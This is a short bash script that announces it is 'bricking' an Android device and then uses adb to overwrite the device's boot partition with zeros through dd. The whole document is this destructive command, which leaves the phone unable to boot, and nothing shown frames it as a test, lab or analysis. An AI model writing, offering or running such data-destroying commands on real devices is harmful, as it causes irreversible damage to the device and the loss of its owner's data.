#!/bin/bash  
echo "[+] Bricking Android device..."  
adb shell "dd if=/dev/zero of=/dev/block/platform/soc/1d84000.ufshc/by-name/boot"  
